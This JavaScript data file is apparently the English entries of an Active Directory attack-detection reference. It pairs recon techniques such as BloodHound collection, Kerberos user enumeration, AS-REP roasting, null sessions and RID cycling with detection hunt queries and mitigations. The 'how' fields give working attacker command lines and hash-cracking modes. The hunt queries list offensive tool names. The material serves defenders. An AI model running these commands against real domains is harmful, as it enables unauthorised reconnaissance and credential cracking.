window.AD = window.AD || {};
AD.I18N = AD.I18N || { ja: {}, en: {} };
AD.I18N.en.attacks = [{"name":"BloodHound / SharpHound Collection","aka":"SharpHound.exe, AzureHound, RustHound, BloodHound CE, bloodhound-python","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1087, T1069, T1482, T1615","cve":"","sev":"High","summary":"Reconnaissance tool that mass-collects AD/AzureAD objects, ACLs, sessions, and trusts and visualizes attack paths in a graph DB.","how":"Runs with any authenticated user (Authenticated Users) on a domain-joined host. Use SharpHound.exe -c All, or specify CollectionMethod values such as DCOnly/Session/LoggedOn/ACL/Trusts. DCOnly is stealthy (LDAP only); Session touches ports 445/135 on computers. Import the output zip into the BloodHound GUI and query e.g. Shortest Path to Domain Admins. Remote collection is also possible via bloodhound-python (Linux) or RustHound.","tools":"SharpHound.exe, bloodhound-python, RustHound, AzureHound, BloodHound CE/Legacy GUI, Cypher クエリ","detect":"Characteristic signals are bursts of LDAP queries in a short window and SMB/RPC session enumeration across all computers (NetSessionEnum, NetWkstaUserEnum). Microsoft Defender for Identity (MDI) detects SharpHound enumeration patterns. Correlate events 4661/4662 (DS Access auditing) and spikes in network session enumeration. Access attempts against honey users/honey computers are also effective canaries.","events":"4662, 4661, 5145, 4624(Type3大量), 4798, 4799","mitigate":"Limit session enumeration with Net Cease (restricting anonymous access to NetSessionEnum). Apply the GPO restricting SAMR enumeration (Network access: Restrict clients allowed to make remote calls to SAM). Deploy behavioral detection via EDR/MDI, and periodically review excess ACL permissions to reduce attack paths.","triage":"On the source host check Sysmon EID1 for `SharpHound.exe`/PowerShell/.NET launch and EID3 for a fan-out of short-lived 445/135 connections to nearly every computer. If the target's 4798 (local user membership enum)/4799 (local group enum) plus the DC's 4662 (bulk DS Access), 5145 (SYSVOL/IPC$), 4624 Type3 against honey user/computer objects, and MDI `Reconnaissance using SMB session enumeration`/`LDAP` chain under one account within minutes, it is a True Positive. A lone 4798/4662, periodic NetSessionEnum from known SCCM/asset-mgmt/vuln-scanner/monitoring IPs, or activity inside an approved PingCastle audit window leans Benign.","hunt":[{"plat":"MDI","t":"One source firing hundreds of LDAP queries across the whole tree in minutes = black / steady low-volume admin lookups = white","q":"IdentityQueryEvents\n| where Timestamp > ago(1d)\n| where QueryType == \"LDAP\"\n| summarize LdapQueries=count(), DistinctTargets=dcount(QueryTarget) by AccountName, DeviceName, IPAddress, bin(Timestamp, 15m)\n| where LdapQueries > 300 and DistinctTargets > 100\n| order by LdapQueries desc"},{"plat":"MDE","t":"SharpHound/BloodHound collection command line executed = black / no match = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"Invoke-BloodHound\",\"SharpHound\",\"--collectionmethod\",\"-c all\",\"--zipfilename\",\"bloodhound-python\",\"rusthound\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName"}],"huntcs":[{"plat":"Event Search","t":"SharpHound/AzureHound collector execution=bad / one-off admin AD lookup=benign","q":"event_simpleName=ProcessRollup2 (FileName IN (\"SharpHound.exe\",\"AzureHound.exe\",\"RustHound.exe\") OR CommandLine=\"*Invoke-BloodHound*\" OR CommandLine=\"*--CollectionMethod*\" OR CommandLine=\"*bloodhound-python*\" OR CommandLine=\"*--zip*\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine\n| sort - count"},{"plat":"Event Search","t":"one host fans out to many hosts on 445/135/389=bad / steady few connections=benign","q":"event_simpleName=NetworkConnectIP4 (RemotePort=445 OR RemotePort=135 OR RemotePort=389 OR RemotePort=3268)\n| stats dc(RemoteAddressIP4) as hosts by aid, ComputerName, ContextBaseFileName\n| where hosts > 30\n| sort - hosts"}]},{"name":"LDAP Enumeration","aka":"ldapsearch, ADExplorer, ldapdomaindump, windapsearch, adsisearcher","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1087.002, T1069.002, T1018","cve":"","sev":"Medium","summary":"Basic collection technique that directly queries users, groups, OUs, GPOs, and attributes over LDAP/LDAPS (389/636/3268).","how":"Connect to a DC's LDAP with Authenticated Users rights (sometimes via anonymous/NULL bind). Use ldapsearch -x -H ldap://dc -b 'DC=corp,DC=local', PowerShell's [adsisearcher], windapsearch, or ldapdomaindump. Target attributes such as userAccountControl, servicePrincipalName, description (plaintext passwords leaked in), adminCount, and ms-Mcs-AdmPwd (LAPS). Dump all objects via paged searches.","tools":"ldapsearch, windapsearch, ldapdomaindump, ADExplorer(Sysinternals), PowerView Get-Domain*, adsisearcher","detect":"Detection signals are large-scale, broad LDAP queries from a single source and unusual attribute filters. Enable LDAP diagnostic logging on the DC (15 Field Engineering) and Advanced Auditing's Directory Service Access (4662) to correlate. Detect short-window full-tree paged searches with MDI or SIEM.","events":"4662, 1644(LDAP診断ログ), 2889(非署名LDAPバインド)","mitigate":"Enforce LDAP signing/channel binding and disable anonymous binds. Enforce a practice of not storing sensitive data in attributes such as description. Disable anonymous access via dsHeuristics and restrict Read access to sensitive attributes with ACLs.","triage":"On the DC review 4662 (Directory Service Access) and, if enabled, 1644 (LDAP diagnostics, 15 Field Engineering) for a single source doing full-tree paged searches or abnormal filters on `userAccountControl`/`servicePrincipalName`/`ms-Mcs-AdmPwd`. It is malicious when the source Sysmon EID1 shows `ldapsearch`/`windapsearch`/`adsisearcher`/PowerView, EID3 shows sustained 389/636, and 2889 (unsigned LDAP bind) line up under the same account and time. Steady business-hours paged queries from known monitoring/IAM-sync/vuln-scanner/SCCM service accounts are Benign; judge against baseline.","hunt":[{"plat":"MDI","t":"Broad enumerating LDAP filters concentrated from one source in a short window = black / scoped app searches = white","q":"IdentityQueryEvents\n| where Timestamp > ago(1d)\n| where QueryType == \"LDAP\"\n| where Query has_any (\"(objectClass=*)\",\"(objectClass=user)\",\"(objectClass=computer)\",\"samaccounttype\",\"userAccountControl\")\n| summarize Queries=count(), Targets=dcount(QueryTarget) by IPAddress, DeviceName, AccountName, bin(Timestamp, 10m)\n| where Queries > 200\n| order by Queries desc"},{"plat":"MDE","t":"Execution of ldapsearch/ADExplorer/adsisearcher enumeration tooling = black / normal processes = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where FileName in~ (\"ldapsearch.exe\",\"windapsearch.exe\",\"ADExplorer.exe\",\"ADExplorer64.exe\") or ProcessCommandLine has_any (\"adsisearcher\",\"ldapdomaindump\",\"DirectorySearcher\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine"}],"huntcs":[{"plat":"Event Search","t":"known LDAP enum tool/ADSISearcher execution=bad / legit RSAT query=benign","q":"event_simpleName=ProcessRollup2 (FileName IN (\"ldapsearch.exe\",\"AdExplorer.exe\",\"windapsearch.exe\") OR CommandLine=\"*ldapdomaindump*\" OR CommandLine=\"*adsisearcher*\" OR CommandLine=\"*DirectorySearcher*\" OR CommandLine=\"*(objectClass=*\")\n| stats count by ComputerName, UserName, FileName, CommandLine\n| sort - count"},{"plat":"LogScale","t":"non-LDAP client hammering 389/3268=bad / host→single DC light LDAP=benign","q":"#event_simpleName=NetworkConnectIP4\n| in(RemotePort, values=[\"389\",\"636\",\"3268\",\"3269\"])\n| groupBy([aid, ComputerName, ContextBaseFileName], function=count(as=conns))\n| conns > 200\n| sort(conns, order=desc)"}]},{"name":"SPN Scanning (Kerberoast recon)","aka":"GetUserSPNs, setspn -Q, PowerView Get-NetUser -SPN","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1018, T1087.002, T1558.003(前段)","cve":"","sev":"Medium","summary":"Enumerates service accounts holding a servicePrincipalName via LDAP to identify Kerberoastable targets and service placement.","how":"Executable simply by querying the LDAP filter (servicePrincipalName=*) as an authenticated user. Use setspn -T corp -Q */*, Get-NetUser -SPN, impacket's GetUserSPNs.py, or Rubeus kerberoast /stats. A stealthy technique that requires no network scanning and simultaneously performs host discovery (inferring service placement from MSSQL/HTTP/CIFS SPNs) and Kerberoast candidate selection.","tools":"setspn.exe, PowerView Get-NetUser/Get-NetComputer -SPN, GetUserSPNs.py(impacket), Rubeus","detect":"Concentrated LDAP queries against the SPN attribute are a sign of Kerberoast preparation. Since it is hard to distinguish from normal traffic on its own, detect via correlation with an immediately following TGS-REQ (4769, RC4 encryption request). Monitoring access to honey SPNs (decoy accounts assigned unused dummy SPNs) is effective.","events":"4662, 4769(後続のKerberoastで)","mitigate":"Convert service accounts to gMSA (group Managed Service Accounts) to remove SPNs from human-managed accounts. Increase Kerberoast resistance with strong passwords (25+ characters) and enforced AES encryption. Deploy honey SPN accounts as decoys.","triage":"On the DC use 4662 to spot concentrated access to the `servicePrincipalName` attribute (equivalent to filter `(servicePrincipalName=*)`) and correlate with source Sysmon EID1 for `setspn.exe -Q */*`/`GetUserSPNs.py`/`Rubeus`/PowerView `-SPN`. It is a True Positive if a burst of DC 4769 (TGS-REQ) follows, especially Ticket Encryption Type 0x17 (RC4) from the same account, plus any honey-SPN hit. An ops `setspn -L` one-off or scoped business-hours queries from an SPN-inventory/monitoring tool with no ensuing 4769 spike is Benign.","hunt":[{"plat":"MDI","t":"Focused LDAP queries on servicePrincipalName = black (Kerberoast prep) / one-off admin lookup = white","q":"IdentityQueryEvents\n| where Timestamp > ago(1d)\n| where QueryType == \"LDAP\" and Query has \"servicePrincipalName\"\n| summarize Queries=count(), Targets=dcount(QueryTarget) by AccountName, IPAddress, DeviceName, bin(Timestamp, 10m)\n| where Queries > 15\n| order by Queries desc"},{"plat":"Sentinel","t":"One account requesting RC4 (0x17) TGS for many SPNs = black / single-service normal use = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769 and TicketEncryptionType == \"0x17\"\n| where ServiceName !endswith \"$\" and ServiceName != \"krbtgt\"\n| summarize SPNs=dcount(ServiceName), Requests=count() by Account, IpAddress, bin(TimeGenerated, 1h)\n| where SPNs > 5\n| order by SPNs desc"}],"huntcs":[{"plat":"Event Search","t":"setspn -Q/GetUserSPNs/PowerView SPN attribute query=bad / SCCM steady SPN reads=benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*setspn*-Q*\" OR CommandLine=\"*GetUserSPNs*\" OR CommandLine=\"*Get-NetUser*-SPN*\" OR CommandLine=\"*Get-DomainUser*-SPN*\" OR CommandLine=\"*servicePrincipalName*\")\n| stats count by ComputerName, UserName, FileName, CommandLine\n| sort - count"}]},{"name":"Kerberos User Enumeration (Pre-Auth / AS-REP probing)","aka":"kerbrute userenum, Kerberos username enumeration","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1087.002","cve":"","sev":"Medium","summary":"Enumerates valid usernames without authentication by distinguishing KDC AS-REQ responses (KDC_ERR_PREAUTH_REQUIRED vs PRINCIPAL_UNKNOWN).","how":"No pre-authentication required. Send AS-REQ to port 88 and exploit the difference: existing users return KDC_ERR_PREAUTH_REQUIRED (25 / 0x19) while non-existent users return KDC_ERR_C_PRINCIPAL_UNKNOWN (6 / 0x6) (24/0x18 is KDC_ERR_PREAUTH_FAILED = wrong password, which is different). Use kerbrute userenum -d corp.local userlist.txt, Rubeus, or nmap krb5-enum-users. Validates usernames en masse without triggering account lockout (no password attempts involved).","tools":"kerbrute, Rubeus, nmap(krb5-enum-users), impacket","detect":"The signal is a spike in failed AS-REQs (event 4768 Failure) for many different usernames in a short window. Detect large volumes of 4768 for non-existent usernames, or many principal lookups from a single source IP. MDI detects Kerberos enumeration behavior.","events":"4768(結果コード 0x6=非存在 / 0x19=存在・要事前認証), 4771","mitigate":"Username enumeration cannot be fully prevented at the Kerberos protocol level, so rely on detection and rate-limiting. Block external access to the KDC (88) with an authenticating proxy/firewall and alert on high-volume 4768 (result code 0x6/0x19) from a single source. Use naming conventions that are hard to guess and deploy honey accounts to detect enumeration. (Note: enabling pre-authentication is an AS-REP Roasting mitigation and does not stop this enumeration.)","triage":"On the DC inspect 4768 for a single source IP alternating result codes 0x6 (KDC_ERR_C_PRINCIPAL_UNKNOWN = nonexistent) and 0x19 (KDC_ERR_PREAUTH_REQUIRED = exists) across many distinct principals in a short window (distinct from 0x18 = PREAUTH_FAILED wrong-password). It is malicious with source EDR/Sysmon EID1 for `kerbrute`/`Rubeus`/`nmap krb5-enum-users`, EID3 high-rate port 88, and an MDI account-enumeration alert. A few 4768 from one legitimate user at logon, or steady Kerberos from an auth-proxy/VPN gateway, is Benign.","hunt":[{"plat":"Sentinel","t":"Spike of 4768 failures (0x6 nonexistent / 0x19 preauth-required) with many usernames from one IP = black / a few typos = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4768 and Status in (\"0x6\",\"0x19\")\n| summarize DistinctUsers=dcount(TargetUserName), Attempts=count(), Nonexistent=countif(Status==\"0x6\") by IpAddress, bin(TimeGenerated, 10m)\n| where DistinctUsers > 20\n| order by DistinctUsers desc"}],"huntcs":[{"plat":"Event Search","t":"kerbrute-style username enum tool execution=bad / normal single Kerberos auth=benign","q":"event_simpleName=ProcessRollup2 (FileName=\"kerbrute*\" OR CommandLine=\"*kerbrute*\" OR CommandLine=\"*userenum*\" OR CommandLine=\"*--dc*--domain*\")\n| stats count by ComputerName, UserName, FileName, CommandLine\n| sort - count"},{"plat":"Identity Protection","t":"DC 4768 failure burst (0x6 no-such-user) has no host footprint→rely on IdP detection","q":"// Falcon Identity Protection detection: Kerberos-based user enumeration / account enumeration reconnaissance (DC 4768 KDC_ERR_C_PRINCIPAL_UNKNOWN burst — DC-only, not an EDR hunt)"}]},{"name":"AS-REP Roasting recon (pre-auth-disabled accounts)","aka":"GetNPUsers, Rubeus asreproast","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1558.004, T1087.002","cve":"","sev":"High","summary":"Enumerates accounts with Kerberos pre-authentication disabled (DONT_REQ_PREAUTH) via LDAP and obtains offline-crackable AS-REPs.","how":"Enumerate accounts holding userAccountControl:1.2.840.113556.1.4.803:=4194304 (DONT_REQ_PREAUTH) via LDAP. Without authentication, use GetNPUsers.py -no-pass or Rubeus asreproast to obtain the encrypted part of the AS-REP (the enc-part sealed with the user's long-term/password-derived key) and crack it offline with hashcat (-m 18200) — the TGT embedded in the AS-REP is encrypted with the krbtgt key and is not the crackable material. Executable even without credentials if a username list is available.","tools":"GetNPUsers.py(impacket), Rubeus asreproast, hashcat -m 18200","detect":"Signs include AS-REQ (4768) against accounts holding the DONT_REQ_PREAUTH attribute and LDAP searches for the pre-auth-disabled attribute. Investigate if a TGT is issued without pre-authentication for an account not used in normal operations. Monitor for RC4-encrypted (etype 0x17) ticket requests.","events":"4768(pre-auth type 0), 4662","mitigate":"Make pre-authentication mandatory on all accounts and eliminate the DONT_REQ_PREAUTH flag (audit periodically). For accounts that unavoidably disable it, enforce strong passwords and AES encryption. Set the same flag on honeypot accounts for decoy detection.","triage":"On the DC use 4662 to find searches matching filter `userAccountControl:1.2.840.113556.1.4.803:=4194304` (DONT_REQ_PREAUTH), then check whether 4768 (Pre-Authentication Type 0) is issued for those accounts with Ticket Encryption Type 0x17 (RC4). It is a True Positive when source Sysmon EID1 shows `GetNPUsers.py`/`Rubeus asreproast` plus port-88 traffic under the same account and time, targeting accounts that never use TGTs operationally. A legacy/service account with pre-auth legitimately disabled simply obtaining its own TGT, with no external tooling or bulk enum, is Benign.","hunt":[{"plat":"MDI","t":"LDAP search targeting userAccountControl bit 4194304 (DONT_REQ_PREAUTH) = black / no match = white","q":"IdentityQueryEvents\n| where Timestamp > ago(1d)\n| where QueryType == \"LDAP\" and Query has \"userAccountControl\" and Query has \"4194304\"\n| project Timestamp, AccountName, IPAddress, DeviceName, Query, QueryTarget"},{"plat":"Sentinel","t":"Many RC4 (0x17) AS-REQ tickets (4768) from one source = black (AS-REP roast harvest) / normal TGT issuance = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4768 and TicketEncryptionType == \"0x17\"\n| summarize Accounts=dcount(TargetUserName), Tickets=count() by IpAddress, bin(TimeGenerated, 10m)\n| where Tickets > 10\n| order by Tickets desc"}],"huntcs":[{"plat":"Event Search","t":"GetNPUsers/Rubeus asreproast or DONT_REQ_PREAUTH UAC filter query=bad / normal ops=benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*asreproast*\" OR CommandLine=\"*GetNPUsers*\" OR CommandLine=\"*DONT_REQ_PREAUTH*\" OR CommandLine=\"*userAccountControl:1.2.840.113556.1.4.803:=4194304*\" OR CommandLine=\"*Get-DomainUser*-PreauthNotRequired*\")\n| stats count by ComputerName, UserName, FileName, CommandLine\n| sort - count"}]},{"name":"Null Session / Anonymous Enumeration","aka":"IPC$ null session, rpcclient anonymous, enum4linux","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1087, T1135, T1590","cve":"","sev":"Medium","summary":"Connects to the IPC$ share or SAMR/LSARPC without credentials to enumerate users, groups, shares, and domain policy.","how":"Null-bind with net use \\\\target\\IPC$ '' /u:'', then run enumdomusers/enumdomgroups/querydominfo/lsaenumsid via rpcclient -U '' -N target. Automate bulk enumeration with enum4linux-ng -a target. Anonymous enumeration succeeds on legacy configs (RestrictAnonymous=0), legacy hosts, and some NAS/printers. Includes SMB share enumeration (smbclient -L -N).","tools":"rpcclient, enum4linux(-ng), smbclient, nmap smb-enum-*, NetExec -u '' -p ''","detect":"Detection targets are SMB/IPC$ access via anonymous (NULL) authentication and rpcclient SAMR/LSARPC calls. Monitor events 5140/5145 (share access) where the user is anonymous (ANONYMOUS LOGON), and 4624 Type 3 ANONYMOUS LOGON.","events":"5140, 5145, 4624(ANONYMOUS LOGON)","mitigate":"Enable RestrictAnonymousSAM=1 (RestrictAnonymous=2 is effective only on the Win2000 generation) and Network access: Do not allow anonymous enumeration of SAM accounts and shares. Disable SMBv1 to block legacy anonymous access. Restrict 445/139 to internal-only at the firewall.","triage":"On the target confirm 4624 with Logon Type3, Account Name = ANONYMOUS LOGON, Authentication Package = NTLM, then check the ensuing 5140/5145 for Share Name `IPC$` with Access Mask/RelativeTargetName pointing at the `samr`/`lsarpc` named pipes. It is malicious when source Sysmon EID1 shows `rpcclient`/`enum4linux`/`NetExec -u '' -p ''` plus port-445 connections at the same time and source, followed by bulk SID/user enumeration. Limited IPC$ access from a legacy NAS/printer (RestrictAnonymous unset) or from a known asset-mgmt/vuln-scanner IP is Benign; disambiguate by source IP and rate.","hunt":[{"plat":"Sentinel","t":"Repeated ANONYMOUS LOGON Type3 logons / IPC$ share access = black / authenticated access = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4624,5140,5145)\n| where TargetUserName =~ \"ANONYMOUS LOGON\" or SubjectUserName =~ \"ANONYMOUS LOGON\"\n| where LogonType == 3 or EventID in (5140,5145)\n| summarize Events=count(), Shares=dcount(ShareName) by Computer, IpAddress, bin(TimeGenerated, 10m)\n| where Events > 5\n| order by Events desc"},{"plat":"MDI","t":"Repeated anonymous NTLM logons = black (null-session enum) / named-account logons = white","q":"IdentityLogonEvents\n| where Timestamp > ago(1d)\n| where Protocol == \"Ntlm\" and AccountName in~ (\"ANONYMOUS LOGON\",\"\")\n| summarize Logons=count() by DeviceName, IPAddress, bin(Timestamp, 10m)\n| where Logons > 5\n| order by Logons desc"}],"huntcs":[{"plat":"Event Search","t":"ANONYMOUS LOGON Type3 from many source IPs=bad / single anonymous ref=benign","q":"event_simpleName=UserLogon UserName=\"ANONYMOUS LOGON\" LogonType=3\n| stats count dc(RemoteAddressIP4) as src by ComputerName\n| where count > 10 OR src > 3\n| sort - count"},{"plat":"Event Search","t":"enum4linux/rpcclient anonymous-enum process=bad / admin interactive SMB=benign","q":"event_simpleName=ProcessRollup2 (FileName IN (\"enum4linux\",\"enum4linux-ng\",\"rpcclient\") OR CommandLine=\"*rpcclient*-U*%*\" OR CommandLine=\"*-N*//*\" OR CommandLine=\"*enumdomusers*\")\n| stats count by ComputerName, UserName, FileName, CommandLine\n| sort - count"}]},{"name":"RID Cycling","aka":"RID brute-forcing, SID cycling, lookupsids","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1087.002, T1589","cve":"","sev":"Medium","summary":"Enumerates all accounts by sequentially appending RIDs (500, 512, 1000...) to a known domain SID and resolving names via LSARPC.","how":"After obtaining the domain SID (e.g., S-1-5-21-...), resolve names via LookupSids/LookupNames using consecutive RIDs starting at 500. Use lookupsid.py corp/user:pass@target 20000, rpcclient's lookupsids, enum4linux -r, or NetExec --rid-brute. With anonymous or low-privileged accounts, it may bypass restricted SAMR enumeration via LSARPC.","tools":"lookupsid.py(impacket), rpcclient(lookupsids), NetExec --rid-brute, enum4linux -r","detect":"A clear signal is large volumes of SID<->name resolution requests (LSARPC LsarLookupSids) against consecutive RIDs. Detect short-window sequential name resolution or many SID lookups within a single session. MDI warns on reconnaissance using account enumeration.","events":"4661, 4662, 5145(lsarpc/samr パイプアクセス)","mitigate":"Set Restrict clients allowed to make remote calls to SAM (SAMR access restriction) to administrators only. Disable anonymous access and control access to LSARPC. Set alerts on abnormal SID lookup volumes.","triage":"On the target/DC review 5145 for access to the `lsarpc` (or `samr`) pipe plus 4661/4662, and check whether a single session performs bulk sequential name resolution (LSARPC LsarLookupSids) over consecutive RIDs starting at 500. It is a True Positive when source Sysmon EID1 shows `lookupsid.py`/`rpcclient`/`NetExec --rid-brute`/`enum4linux -r` with 445/135 connections under the same account/time, plus an MDI account-enumeration alert. A legitimate identity-sync/migration tool resolving known accounts in an orderly way, without consecutive-RID brute forcing, is Benign; disambiguate by RID contiguity and volume.","hunt":[{"plat":"MDI","t":"Bulk sequential-RID SAMR name resolution from one session = black / a few SAMR lookups = white","q":"IdentityQueryEvents\n| where Timestamp > ago(1d)\n| where QueryType == \"SAMR\"\n| summarize Lookups=count(), Targets=dcount(QueryTarget) by AccountName, IPAddress, DeviceName, bin(Timestamp, 5m)\n| where Lookups > 50 or Targets > 50\n| order by Lookups desc"},{"plat":"Sentinel","t":"Many 4661 SAM object handle/lookups in a short window = black / normal directory reads = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4661 and ObjectType has_any (\"SAM_USER\",\"SAM_DOMAIN\",\"SAM_GROUP\")\n| summarize Lookups=count() by SubjectUserName, IpAddress, Computer, bin(TimeGenerated, 5m)\n| where Lookups > 100\n| order by Lookups desc"}],"huntcs":[{"plat":"Event Search","t":"high-volume lsarpc/samr pipe connects=RID/SID cycling=bad / few normal RPC=benign","q":"event_simpleName=NamedPipeConnected (PipeName=\"*lsarpc*\" OR PipeName=\"*samr*\")\n| stats count by ComputerName, ContextBaseFileName\n| where count > 50\n| sort - count"},{"plat":"Event Search","t":"impacket lookupsid-style sequential SID-resolve tool=bad / one-off lookup=benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*lookupsid*\" OR CommandLine=\"*LsarLookupSids*\" OR CommandLine=\"*-rid-brute*\" OR CommandLine=\"*ridenum*\")\n| stats count by ComputerName, UserName, FileName, CommandLine\n| sort - count"}]},{"name":"Automated AD Audit Tools (PingCastle / ADRecon / PowerView / Purple Knight)","aka":"PingCastle, ADRecon, PowerView, Purple Knight, Group3r, ADeleg","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1087, T1482, T1615, T1069","cve":"","sev":"High","summary":"A family of audit/recon tools that comprehensively and automatically collect AD configuration, vulnerabilities, delegation, trusts, and GPOs and produce reports.","how":"Run as an authenticated user. PingCastle --healthcheck computes a domain-wide vulnerability score over LDAP/SMB/RPC. ADRecon.ps1 generates an Excel report. PowerView (Get-DomainUser/Get-NetGPO/Find-InterestingDomainAcl/Invoke-ACLScanner) explores ACLs and delegation. Attackers repurpose defensive audit tools to quickly grasp weaknesses (weak delegation, old passwords, trusts).","tools":"PingCastle, ADRecon, PowerView(PowerSploit), Purple Knight, Group3r, SharpView","detect":"Tools like PingCastle issue large volumes of LDAP/SMB/RPC queries in a short window, detectable as deviation from baseline. Detect PowerView via AMSI/script block logging (4104) or known-tool signatures with EDR. Monitor for execution outside approved audits.","events":"4104(PowerShellスクリプトブロック), 4662, 5145","mitigate":"Enable PowerShell Constrained Language Mode and AMSI to impede PowerView execution. Defenders should legitimately self-audit with these tools and remediate weaknesses first (review delegation, deploy LAPS). Block script-based reconnaissance with EDR.","triage":"On the source check Sysmon EID1 for `PingCastle`/`ADRecon.ps1`/`PurpleKnight` and 4104 (PowerShell Script Block Logging) for PowerView functions `Get-DomainUser`/`Find-InterestingDomainAcl`/`Invoke-ACLScanner`. It is malicious when a DC 4662 flood, 5145 (SYSVOL/shares) and short-burst LDAP/SMB/RPC chain under one account/time and deviate from baseline. Execution inside an approved security-audit/red-team window from a known audit service account and host with prior notice is Benign; adjudicate by matching operator, host, and time against change-management records.","hunt":[{"plat":"MDE","t":"PingCastle/ADRecon/PurpleKnight/PowerView function execution = black / outside approved audit = investigate","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where FileName in~ (\"PingCastle.exe\",\"ADRecon.exe\",\"PurpleKnight.exe\",\"Group3r.exe\") or ProcessCommandLine has_any (\"PingCastle\",\"ADRecon\",\"Invoke-ADRecon\",\"Purple Knight\",\"Get-NetDomain\",\"Invoke-UserHunter\",\"Get-DomainUser\",\"PowerView\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName"},{"plat":"MDI","t":"One account issuing huge multi-protocol (LDAP/SAMR/DNS) query volume = black (automated audit sweep) / normal ops = white","q":"IdentityQueryEvents\n| where Timestamp > ago(1d)\n| summarize Queries=count(), Protocols=dcount(QueryType), Targets=dcount(QueryTarget) by AccountName, IPAddress, DeviceName, bin(Timestamp, 15m)\n| where Queries > 500 and Targets > 150\n| order by Queries desc"}],"huntcs":[{"plat":"Event Search","t":"PingCastle/ADRecon/PowerView/Purple Knight run=bad / only sanctioned audit host=benign","q":"event_simpleName=ProcessRollup2 (FileName IN (\"PingCastle.exe\",\"ADRecon.exe\",\"PurpleKnight.exe\") OR CommandLine=\"*PingCastle*\" OR CommandLine=\"*ADRecon*\" OR CommandLine=\"*Invoke-UserHunter*\" OR CommandLine=\"*Get-NetDomain*\" OR CommandLine=\"*Group3r*\")\n| stats count by ComputerName, UserName, FileName, CommandLine\n| sort - count"}]},{"name":"DNS Enumeration (AD-integrated DNS / Zone Transfer)","aka":"AXFR zone transfer, adidns dump, dnscmd enumeration","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1590.002, T1046, T1018","cve":"","sev":"Medium","summary":"Collects host and SRV records from AD-integrated DNS zones to map the internal network and service placement (DC/GC/Kerberos).","how":"Identify DC/GC/KDC by querying SRV records (_ldap._tcp.dc._msdcs, _kerberos._tcp, _gc._tcp). Obtain all records if zone transfer (dig axfr corp.local @dc) is permitted. AD-integrated DNS can be enumerated by authenticated users via LDAP (CN=MicrosoftDNS) or adidnsdump (NetExec). Records can also be injected by abusing DNS dynamic updates. dnsrecon/dnsenum are also used.","tools":"dig/nslookup(axfr), dnsrecon, dnsenum, adidnsdump, dnscmd, nmap dns-srv-enum","detect":"Signs include zone transfer (AXFR) requests and exhaustive queries for SRV/large record sets. Monitor the source of AXFR and abnormal query volumes via DNS audit logs (Analytical/Debug logs). Detect zone transfer attempts from unauthorized IPs.","events":"DNS Server Analyticalログ(AXFR), 6001(DNS)","mitigate":"Restrict zone transfers to approved secondary DNS servers only (or disable via AD integration). Set DNS dynamic updates to secure (authenticated) only. Review ADIDNS ACLs and do not expose internal DNS externally.","triage":"On the DC use the DNS Server Analytical log to find the source IP of AXFR (zone transfer) requests, plus exhaustive SRV (`_ldap._tcp`/`_kerberos._tcp`/`_gc._tcp`) queries, abnormal query volume, and 6001. It is a True Positive when source Sysmon EID1 shows `dig axfr`/`dnsrecon`/`dnsenum`/`adidnsdump`, or LDAP enumeration of `CN=MicrosoftDNS` (4662), chains from the same source/time and the AXFR comes from a non-authorized IP. Scheduled AXFR from an authorized secondary DNS/monitoring server, or normal SRV resolution by legitimate clients, is Benign; disambiguate by whether the source IP is allowlisted.","hunt":[{"plat":"MDI","t":"Exhaustive DNS queries over SRV/all records from one source = black (ADIDNS dump) / normal resolution = white","q":"IdentityQueryEvents\n| where Timestamp > ago(1d)\n| where QueryType == \"DNS\"\n| summarize DnsQueries=count(), Records=dcount(QueryTarget) by AccountName, IPAddress, DeviceName, bin(Timestamp, 10m)\n| where DnsQueries > 100 or Records > 50\n| order by DnsQueries desc"},{"plat":"MDE","t":"TCP/53 (AXFR zone transfer) from a non-DNS-server host = black / legitimate DC replication = white","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where RemotePort == 53 and Protocol == \"Tcp\"\n| where InitiatingProcessFileName has_any (\"nslookup.exe\",\"dig.exe\",\"powershell.exe\",\"dnscmd.exe\",\"python.exe\")\n| summarize Conns=count() by DeviceName, InitiatingProcessFileName, RemoteIP, bin(Timestamp, 10m)\n| where Conns > 3\n| order by Conns desc"}],"huntcs":[{"plat":"Event Search","t":"workstation-issued AXFR zone transfer=bad / legit secondary-DNS transfer=benign","q":"event_simpleName=DnsRequest RequestType=\"AXFR\"\n| stats count by ComputerName, ContextBaseFileName, DomainName\n| sort - count"},{"plat":"Event Search","t":"dnscmd/nslookup ls DNS-dump process=bad / admin single-record lookup=benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*dnscmd*/zoneprint*\" OR CommandLine=\"*dnscmd*/enumrecords*\" OR CommandLine=\"*nslookup*ls*-d*\" OR CommandLine=\"*Get-DnsServerZone*\" OR CommandLine=\"*adidnsdump*\")\n| stats count by ComputerName, UserName, FileName, CommandLine\n| sort - count"}]},{"name":"GPO Enumeration","aka":"Get-GPO, SYSVOL crawling, Group3r, gpp-decrypt","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1615, T1552.006, T1069.002","cve":"","sev":"High","summary":"Enumerates GPOs and SYSVOL 